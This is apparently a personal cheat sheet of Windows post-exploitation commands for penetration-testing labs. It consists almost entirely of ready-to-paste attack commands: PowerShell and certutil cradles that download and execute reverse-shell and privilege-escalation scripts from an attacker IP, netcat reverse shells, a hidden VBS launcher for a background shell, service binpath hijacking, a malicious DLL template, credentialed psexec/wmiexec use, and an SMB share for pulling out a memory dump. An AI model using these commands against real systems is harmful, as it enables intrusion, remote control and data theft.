# Find file 
```
dir directory\*.txt /s /p
dir C:\proof.txt /s /p
dir C:\network-secret.txt /s /p

Get-Childitem -Path C:\Users\ -Include user.txt -File -Recurse -ErrorAction SilentlyContinue 
```

## Find Alternate Data Stream

## Find all files in a direcory
`dir /R `

## find only ADS
`dir   /s /r | find ":$DATA"`

`dir   /s /r | find ":$DATA" | findStr proof.txt`
# Use streams from sysinternal
```
streams.exe -accepteula -s

certutil -urlcache -split -f http://192.168.119.149/nc.exe nc.exe

certutil -urlcache -split -f http://192.168.119.149/winPEAS/winPEASx64.exe win.exe
```
# Run file remotely
```
powershell -C IEX (New-Object Net.WebClient).DownloadString('http://192.168.119.149/Invoke-PowerShellTcp.ps1')

powershell -C "IEX (New-Object Net.WebClient).DownloadString('http://192.168.119.149/Invoke-PowerShellTcp.ps1')"

powershell -C "IEX (New-Object Net.WebClient).DownloadString('http://192.168.119.149/Sherlock.ps1'); Find-AllVulns "

powershell -C "IEX (New-Object Net.WebClient).DownloadString('http://192.168.119.149/powerUp.ps1');"

powershell -C "IEX (New-Object Net.WebClient).DownloadString('http://192.168.119.149/jaws-enum.ps1');"

powershell -C "IEX (New-Object Net.WebClient).DownloadString('http://192.168.119.149/Sherlock.ps1'); "

powershell -C IEX (New-Object Net.WebClient).DownloadString('http://192.168.119.149/Sherlock.ps1')

powershell -C IEX (New-Object Net.WebClient).DownloadString('http://192.168.119.149/powershell_attack.txt')

$scriptPath = ((new-object net.webclient).DownloadString('http://192.168.43.1/toto.ps1'))
Invoke-Command -ScriptBlock ([scriptblock]::Create($scriptPath)) -ArgumentList "coucou","tata"
```
## Encoded command powershell
```
cat shell3 | iconv --to-code UTF-16LE |   base64 -w 0
powershell -EncodedCommand JwBtAGkAawBlAGYAcgBvAGIAYgBpAG4AcwAuAGMAbwBtACcA

```
## Calling a specific PowerShell function from the command line
```
powershell -File script.ps1 -Command My-Func
powershell -File Sherlock.ps1 -Command Find-AllVulns
powershell -File jaws-enum.ps1 -OutputFileName Jaws-Enum.txt

more < letter.txt
type letter.txt | more 
```

### Download file
```
$url = "http://192.168.119.149/powerUp.ps1";$output = "C:\Users\Chase\Desktop\powerUp.ps1";$wc = New-Object System.Net.WebClient;$wc.DownloadFile($url, $output);

certutil -urlcache -split -f http://192.168.119.149/nc.exe nc.exe

certutil -urlcache -split -f http://192.168.119.149/winPEAS/winPEASx64.exe win.exe

(new-object System.Net.WebClient).DownloadFile('http://192.168.119.149/powerUp.ps1','C:\Windows\Temp\test\powerup.ps1')

(new-object System.Net.WebClient).DownloadFile('http://192.168.119.149/jaws-enum.ps1','C:\Windows\Temp\test\jaws-enum.ps1')

(new-object System.Net.WebClient).DownloadFile('http://192.168.119.149/Sherlock.ps1','C:\Windows\Temp\test\Sherlock.ps1')

(new-object System.Net.WebClient).DownloadFile('http://192.168.119.149/windows-exploit-suggester.py','C:\Windows\Temp\test\windows-exploit-suggester.py')


powershell (new-object System.Net.WebClient).DownloadFile('http://192.168.119.149/MS16-032.ps1','C:\Users\kostas\Desktop\MS16-032.ps1')

powershell -C IEX (New-Object Net.WebClient).DownloadString('http://192.168.119.149/MS16-135.ps1')
```
# Auto-Login (User pivoting)
```
$passwd = ConvertTo-SecureString 'Welcome1!' -AsPlainText -Force;

$creds =New-Object System.Management.Automation.PSCredential('administrator', $passwd)

Start-Process -FilePath "powershell" -argumentlist "IEX(New-Object Net.webClient).downloadString('http://192.168.119.149/Invoke-PowerShellTcp.ps1')" -Credential $creds
```
or
```
Invoke-command -Computer fidelity -scriptblock { c:\\inetpub\\wwwroot\nc.exe 10.10.14.94 1234 -e powershell.exe } -Credential $creds
```

## Runas
```
cat shell3 | iconv --to-code UTF-16LE |   base64 -w 0

runas /profile /savecred /user:ACCESS\Administrator "cmd /c ping -n 1 192.168.119.149" 

runas /profile /savecred /user:ACCESS\Administrator "powershell -C IEX (New-Object Net.WebClient).DownloadString('http://192.168.119.149/Invoke-PowerShellTcp.ps1')" 

Another simple way is
runas /user:ACCESS\Administrator /savecred "powershell -C IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.36/Invoke-PowerShellTcp3.ps1')"
```

## Invoke command (Run a script as another user with creds found)
```
$password = convertto-securestring -AsPlainText -Force -String "36mEAhz/B8xQ~2VM"; 

$credential = new-object -typename System.Management.Automation.PSCredential -argumentlist "SNIPER\chris", $password;

Invoke-Command -ComputerName LOCALHOST -ScriptBlock { whoami } -credential $credential;
```



# Copy big file 
```
sudo python3 /opt/impacket/examples/smbserver.py test . -smb2support -username guest -password guest (on linux)

net use x: \\192.168.119.149\test  /user:guest guest 
cmd /c "copy firefox.exe_200131_084937.dmp x:\"
```

# Connect as Admin 
```
python3 /opt/impacket/examples/psexec.py active/Administrator:Ticketmaster1968@10.10.10.100
python3 /opt/impacket/examples/psexec.py active/Administrator@10.10.10.100

python3 /opt/impacket/examples/wmiexec.py active.htb/administrator:ThePassword@10.10.10.100
```

# Backgroud shell
```
## On linux
cat << EOF > hidden.vbs
Set WshShell = CreateObject("WScript.Shell")
WshShell.Run chr(34) & "C:\windows\temp\test\nc.bat" & Chr(34), 0
Set WshShell = Nothing
EOF

cat << EOF > nc.bat
C:\windows\temp\test\nc.exe 192.168.119.149 443 -e cmd
EOF

## On windows

certutil -urlcache -split -f http://192.168.119.149/hidden.vbs

certutil -urlcache -split -f http://192.168.119.149/nc.bat

certutil -urlcache -split -f http://192.168.119.149/nc.exe

cmd /c cscript hidden.vbs
```
### compilation

#### Run msi
```
msiexec /quiet /qn /i C:\PrivEsc\reverse.msi
``` 

#### compile a malicious dll
```
For x64 compile with: "x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll"
For x86 compile with: "i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll"
```
##### Content of windows_dll.c
```
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved) {
    if (dwReason == DLL_PROCESS_ATTACH) {
        system("cmd.exe /k whoami > C:\\Windows\\Temp\\dll.txt");
        ExitProcess(0);
    }
    return TRUE;
}
```

#### Edit Service
```
sc config upnphost binpath= "C:\Inetpub\nc.exe 192.168.1.101 6666 -e c:\Windows\system32\cmd.exe"
sc config upnphost obj= ".\LocalSystem" password= ""
sc config upnphost depend= ""
sc  start upnphost

Get-Service upnphost | start-service
```
